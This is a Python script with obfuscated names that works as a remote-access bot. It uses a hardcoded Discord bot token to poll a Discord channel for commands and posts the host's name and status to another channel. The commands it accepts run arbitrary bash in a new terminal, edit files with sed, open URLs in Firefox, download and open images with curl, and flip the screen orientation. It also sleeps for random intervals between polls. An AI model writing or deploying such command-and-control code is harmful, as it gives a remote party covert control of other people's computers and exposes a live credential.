import http.client as _Y3
import sys as _S9
import json as _J2
import time as _T1
import socket as _K5
import random as _R4
import subprocess as _P6

_TK2 = "GM3l_P.mrkZgJvU5KWSoz1-onol2XfkW6YbmzlF8H1oT4"
_HDS = {"Content-Type": "application/json", 'Authorization': f'Bot MTIzMzQ4MTAxMDc4NDUwNTg1Nw.{_TK2}'}
_IDN = _K5.gethostname().split('.')[0]
_RL = 0

def _SN1(_MSG):
    _DT = {"content": _MSG}
    _JSN = _J2.dumps(_DT)
    _CN = _Y3.HTTPSConnection("discord.com")
    _URL = f"/api/v10/channels/1342067836415381565/messages"
    _CN.request("POST", _URL, body=_JSN, headers=_HDS)
    _CN.getresponse()
    _CN.close()

def _EX():
    print("Exiting...")
    _SN1(f"❌ `[{_IDN}] is deactivated`")
    _S9.exit()

def _REV():
    _P6.run(['xrandr', '--output', 'eDP', '--rotate', 'inverted'], check=True)

def _NRM():
    _P6.run(['xrandr', '--output', 'eDP', '--rotate', 'normal'], check=True)

def _RGT():
    _P6.run(['xrandr', '--output', 'eDP', '--rotate', 'right'], check=True)

def _LFT():
    _P6.run(['xrandr', '--output', 'eDP', '--rotate', 'left'], check=True)

def _NT(_R):
    _P6.Popen(['gnome-terminal', '--', 'bash', '-c', f'{_R}'])

def _SED(_R):
    _RS = _R.split('?')
    _P6.run(['sed', '-i', f'{_RS[0]}', f'{_RS[1]}'], check=True)

def _FFX(_R):
    _P6.run(['firefox', '--new-tab', f'{_R}'], check=True)

def _OPN_IMG(_R):
    _P6.run(f'curl "{_R}" -o img.jpg', shell=True, check=True)
    _P6.run(['xdg-open', 'img.jpg'], check=True)

def _LCHR(_R):
    match _R:
        case "exit":
            _EX()
        case "activated":
            _SN1(f"✅ `{_IDN}-is activated`")
        case "inverted screen":
            _REV()
        case "normal screen":
            _NRM()
        case "right screen":
            _RGT()
        case "left screen":
            _LFT()
        case _:
            return

def _LCHC(_SPL):
    match _SPL[0]:
        case "newterm":
            _NT(_SPL[1])
        case "sed":
            _SED(_SPL[1])
        case "firefox":
            _FFX(_SPL[1])
        case "openimg":
            _OPN_IMG(_SPL[1])
        case _:
            return

def _MAIN():
    global _RL
    while True:
        try:
            _CN = _Y3.HTTPSConnection("discord.com")
            _URL = f"/api/v10/channels/1341791654503514122/messages?limit=1"
            _CN.request("GET", _URL, headers=_HDS)
            _RESP = _CN.getresponse()
            _CONTENT = _RESP.read().decode("utf-8")
            _JSN = _J2.loads(_CONTENT)

            _VAL = _JSN[0]['content']
            _VLS = _VAL.split('$')
            if len(_VLS) == 2:
                if _VLS[0] != _IDN:
                    _T1.sleep(1)
                    continue
                if _RL != _VLS[1]:
                    _RL = _VLS[1]
                    _SPL = _RL.split('!')
                    if len(_SPL) == 2:
                        _LCHC(_SPL)
                    else:
                        _LCHR(_RL)
            elif len(_VLS) == 1:
                if _RL != _VLS[0]:
                    _RL = _VLS[0]
                    _SPL = _RL.split('!')
                    if len(_SPL) == 2:
                        _LCHC(_SPL)
                    else:
                        _LCHR(_RL)
            _T1.sleep(_R4.randint(1, 15))
        except Exception as _E:
            if _E.args[0] == 0:
                _T1.sleep(_R4.randint(5, 20))
            else:
                _SN1(f"❌ `[{_IDN}] Error: {_E}`")
                _T1.sleep(_R4.randint(5, 20))

if __name__ == "__main__":
    _SN1(f"✅ `[{_IDN}] is activated`")
    _MAIN()
